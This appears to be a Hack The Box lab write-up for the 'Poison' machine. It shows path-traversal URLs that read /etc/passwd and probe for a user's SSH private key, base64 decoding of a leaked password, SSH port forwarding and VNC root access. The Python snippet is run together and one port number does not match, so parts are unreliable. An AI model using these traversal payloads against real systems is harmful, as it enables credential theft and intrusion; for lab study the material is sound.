
## Intro


Tags: #OSCPpath #linux #WebApp #LFI #PortForwarding #medium 

------------
# Reconnaissance

Started: 20:37

```shell
source basher target1 10.129.72.55 [IP]
source basher host1 poison.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-20 13:38 -0400
Nmap scan report for 10.129.72.55
Host is up (0.16s latency).
Not shown: 60333 filtered tcp ports (no-response), 5200 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.05 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-20 13:38 -0400
Nmap scan report for poison.htb (10.129.72.55)
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|game console|phone|media device
Running (JUST GUESSING): FreeBSD 11.X|12.X|13.X (97%), Sony embedded (93%), Apple iOS 14.X|15.X (91%), Apple tvOS 14.X|16.X (91%), Apple macOS 11.X (91%)
OS CPE: cpe:/o:freebsd:freebsd:11.0 cpe:/o:freebsd:freebsd:12 cpe:/o:freebsd:freebsd:13 cpe:/o:apple:iphone_os:14 cpe:/o:apple:iphone_os:15 cpe:/o:apple:tvos:14 cpe:/o:apple:tvos:16 cpe:/o:apple:mac_os_x:11
Aggressive OS guesses: FreeBSD 11.0-STABLE (97%), FreeBSD 11.1-STABLE (97%), FreeBSD 11.1-RELEASE (97%), FreeBSD 11.0-RELEASE (96%), FreeBSD 11.3-RELEASE (95%), FreeBSD 11.0-RELEASE - 12.0-CURRENT (95%), FreeBSD 11.1-RELEASE or 11.2-STABLE (93%), FreeBSD 11.2-RELEASE - 11.3 RELEASE (93%), Sony PS5 (FreeBSD 11.0) (93%), FreeBSD 12.0-RELEASE - 12.1-RELEASE (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   55.98 ms 10.10.14.1
2   56.36 ms poison.htb (10.129.72.55)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

------------
# Foothold

## Webapp

![](MediaFiles/Pasted%20image%2020260920203947.png)
typing info.php for example goes here
![](MediaFiles/Pasted%20image%2020260920204010.png)

## LFI

but the key here is the actual url, and particularly the parameter `file`
This format indicates possible LFI, so lets test it

also errors show the actual path
![](MediaFiles/Pasted%20image%2020260920204118.png)
trying multiple directories back leaked the contents of `/etc/passwd`
```
http://poison.htb/browse.php?file=../../../../../etc/passwd
```
![](MediaFiles/Pasted%20image%2020260920204215.png)
```shell
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh 
```
so from here i see that charix is a user we can login (bin/csh), so lets try to leak his private key
```
http://poison.htb/browse.php?file=../../../../../home/charix/.ssh/authorized_keys/id_rsa
```
no luck

lets try leaking other important stuff too
```
http://poison.htb/browse.php?file=../../../../../usr/local/etc/apache24/httpd.conf
```
found it but nothing interesting

but wait, lets get back to the home page, on listfiles.php
![](MediaFiles/Pasted%20image%2020260920204935.png)
that seems like a hint, lets paste it on the url, and here we have it, seems base64
![](MediaFiles/Pasted%20image%2020260920204911.png)
and it also says: `This password is secure, it's encoded atleast 13 times.. what could go wrong really.. ` 

decoding this base64 13 times 
```python
import base64inp_string = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo="times = 13for i in range(times):  
    inp_string = base64.b64decode(inp_string)out_string = inp_string.decode('UTF-8')  
print(out_string)
```
prints the password

#### creds obtained

```
Charix!2#4%6&8(0
```

## Shell as charix

```shell
└─$ ssh charix@poison.htb                                                                                                                      
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(charix@poison.htb) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
To determine whether a file is a text file, executable, or some other type
of file, use

        file filename
                -- Dru <genesis@istar.ca>
charix@Poison:~ % whoami
charix
charix@Poison:~ % ls
secret.zip      user.txt
charix@Poison:~ % cat user.txt
eaacdfb2d141b72a589233063604209c
charix@Poison:~ % 

```

----------
# Privesc

## Filesystem enum

```shell
charix@Poison:~ % ls -la
total 48
drwxr-x---  2 charix  charix   512 Sep 20 19:56 .
drwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..
-rw-r-----  1 charix  charix  1041 Mar 19  2018 .cshrc
-rw-rw----  1 charix  charix     0 Mar 19  2018 .history
-rw-r-----  1 charix  charix   254 Mar 19  2018 .login
-rw-r-----  1 charix  charix   163 Mar 19  2018 .login_conf
-rw-r-----  1 charix  charix   379 Mar 19  2018 .mail_aliases
-rw-r-----  1 charix  charix   336 Mar 19  2018 .mailrc
-rw-r-----  1 charix  charix   802 Mar 19  2018 .profile
-rw-r-----  1 charix  charix   281 Mar 19  2018 .rhosts
-rw-r-----  1 charix  charix   849 Mar 19  2018 .shrc
-r--r--r--  1 charix  charix     0 Sep 20 19:56 secret
-rw-r-----  1 root    charix   166 Mar 19  2018 secret.zip
-rw-r-----  1 root    charix    33 Mar 19  2018 user.txt

```
interesting here is the file secret.zip

tried to unzip, but needs passphrase, so lets try to transfer it to my machine 
```
scp charix@10.10.10.84:secret.zip .
```
before trying to crack it, lets try to use the user's pass as passphrase
it worked! but the extracted file is sth unreadable
```shell
└─$ cat secret
��[|Ֆz!
```
so no luck here, lets move on more enumeration on the target

## Processes

```shell
charix@Poison:~ % ps aux
USER   PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
root    11 100.0  0.0      0    16  -  RL   19:35   33:21.32 [idle]
root     0   0.0  0.0      0   160  -  DLs  19:35    0:00.00 [kernel]
root     1   0.0  0.1   5408   976  -  ILs  19:35    0:00.01 /sbin/init --
root     2   0.0  0.0      0    16  -  DL   19:35    0:00.00 [crypto]
root     3   0.0  0.0      0    16  -  DL   19:35    0:00.00 [crypto returns]
root     4   0.0  0.0      0    32  -  DL   19:35    0:00.03 [cam]
root     5   0.0  0.0      0    16  -  DL   19:35    0:00.00 [mpt_recovery0]
root     6   0.0  0.0      0    16  -  DL   19:35    0:00.00 [sctp_iterator]
root     7   0.0  0.0      0    16  -  DL   19:35    0:00.19 [rand_harvestq]
root     8   0.0  0.0      0    16  -  DL   19:35    0:00.00 [soaiod1]
root     9   0.0  0.0      0    16  -  DL   19:35    0:00.00 [soaiod2]
root    10   0.0  0.0      0    16  -  DL   19:35    0:00.00 [audit]
root    12   0.0  0.1      0   736  -  WL   19:35    0:01.68 [intr]
root    13   0.0  0.0      0    48  -  DL   19:35    0:00.01 [geom]
root    14   0.0  0.0      0   160  -  DL   19:35    0:00.10 [usb]
root    15   0.0  0.0      0    16  -  DL   19:35    0:00.00 [soaiod3]
root    16   0.0  0.0      0    16  -  DL   19:35    0:00.00 [soaiod4]
root    17   0.0  0.0      0    48  -  DL   19:35    0:00.03 [pagedaemon]
root    18   0.0  0.0      0    16  -  DL   19:35    0:00.00 [vmdaemon]
root    19   0.0  0.0      0    16  -  DL   19:35    0:00.00 [pagezero]
root    20   0.0  0.0      0    32  -  DL   19:35    0:00.02 [bufdaemon]
root    21   0.0  0.0      0    16  -  DL   19:35    0:00.00 [bufspacedaemon]
root    22   0.0  0.0      0    16  -  DL   19:35    0:00.03 [syncer]
root    23   0.0  0.0      0    16  -  DL   19:35    0:00.01 [vnlru]
root   332   0.0  0.2  10624  2380  -  Is   19:35    0:00.00 dhclient: le0 [priv] (dhclient)
_dhcp  401   0.0  0.2  10624  2496  -  Is   19:35    0:00.00 dhclient: le0 (dhclient)
root   402   0.0  0.5   9560  5052  -  Ss   19:35    0:00.09 /sbin/devd
root   475   0.0  0.2  10500  2452  -  Ss   19:35    0:00.04 /usr/sbin/syslogd -s
root   628   0.0  0.5  56320  5404  -  S    19:35    0:01.24 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local
root   705   0.0  0.7  57812  7052  -  Is   19:35    0:00.01 /usr/sbin/sshd
root   710   0.0  1.1  99172 11516  -  Ss   19:35    0:00.06 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    722   0.0  1.2 101220 11924  -  I    19:35    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    723   0.0  1.2 101220 12016  -  S    19:35    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    724   0.0  1.2 101220 11960  -  I    19:35    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    725   0.0  1.2 101220 11964  -  I    19:35    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    726   0.0  1.2 101220 11936  -  I    19:35    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   727   0.0  0.6  20636  6140  -  Ss   19:35    0:00.03 sendmail: accepting connections (sendmail)
smmsp  730   0.0  0.6  20636  5808  -  Is   19:35    0:00.00 sendmail: Queue runner@00:30:00 for /var/spool/clientmqueue (sendmail)
root   734   0.0  0.2  12592  2436  -  Is   19:35    0:00.01 /usr/sbin/cron -s
www    790   0.0  1.2 101220 11924  -  I    19:38    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    791   0.0  1.2 101220 11924  -  I    19:38    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   819   0.0  0.8  85228  7840  -  Is   19:54    0:00.01 sshd: charix [priv] (sshd)
charix 822   0.0  0.8  85228  7892  -  S    19:54    0:00.10 sshd: charix@pts/1 (sshd)
root   614   0.0  0.9  23620  8868 v0- I    19:35    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthori
root   626   0.0  0.7  67220  7056 v0- I    19:35    0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
root   627   0.0  0.5  37620  5312 v0- I    19:35    0:00.01 twm
root   781   0.0  0.2  10484  2076 v0  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv0
root   782   0.0  0.2  10484  2076 v1  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv1
root   783   0.0  0.2  10484  2076 v2  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv2
root   784   0.0  0.2  10484  2076 v3  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv3
root   785   0.0  0.2  10484  2076 v4  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv4
root   786   0.0  0.2  10484  2076 v5  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv5
root   787   0.0  0.2  10484  2076 v6  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv6
root   788   0.0  0.2  10484  2076 v7  Is+  19:35    0:00.00 /usr/libexec/getty Pc ttyv7
root   702   0.0  0.4  19660  3616  0  Is+  19:35    0:00.01 -csh (csh)
charix 823   0.0  0.4  19660  3616  1  Ss   19:54    0:00.04 -csh (csh)
charix 891   0.0  0.3  21208  2652  1  R+   20:08    0:00.00 ps aux
```
hm here the vnc snippet is interesting
```shell
root   614   0.0  0.9  23620  8868 v0- I    19:35    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthori
```

## Listening ports

```shell
charix@Poison:~ % sockstat -P tcp
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
charix   sshd       822   3  tcp4   10.129.72.55:22       10.10.14.247:58272
root     sshd       819   3  tcp4   10.129.72.55:22       10.10.14.247:58272
www      httpd      791   3  tcp6   *:80                  *:*
www      httpd      791   4  tcp4   *:80                  *:*
www      httpd      790   3  tcp6   *:80                  *:*
www      httpd      790   4  tcp4   *:80                  *:*
root     sendmail   727   3  tcp4   127.0.0.1:25          *:*
www      httpd      726   3  tcp6   *:80                  *:*
www      httpd      726   4  tcp4   *:80                  *:*
www      httpd      725   3  tcp6   *:80                  *:*
www      httpd      725   4  tcp4   *:80                  *:*
www      httpd      724   3  tcp6   *:80                  *:*
www      httpd      724   4  tcp4   *:80                  *:*
www      httpd      723   3  tcp6   *:80                  *:*
www      httpd      723   4  tcp4   *:80                  *:*
www      httpd      722   3  tcp6   *:80                  *:*
www      httpd      722   4  tcp4   *:80                  *:*
root     httpd      710   3  tcp6   *:80                  *:*
root     httpd      710   4  tcp4   *:80                  *:*
root     sshd       705   3  tcp6   *:22                  *:*
root     sshd       705   4  tcp4   *:22                  *:*
root     Xvnc       614   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       614   3  tcp4   127.0.0.1:5801        *:*
```
here we can see vnc on `5901`, so lets port forward

## Port forwarding 

```shell
ssh -L 3333:localhost:5901 charix@poison.htb
```

## Using VNC (port 5901)

lets try starting vncviewer and passing the extracted secret file as password
```
vncviewer -passwd secret localhost:5904
```

## Shell as root
![](MediaFiles/Pasted%20image%2020260920211406.png)
```shell
root@Poison:~ # id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
root@Poison:~ # cat root.txt
716d04b188419cf2bb99d891272361f5
root@Poison:~ # 
```
ended at 21:19, under 1 hour

---
# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 



---

# Sidenotes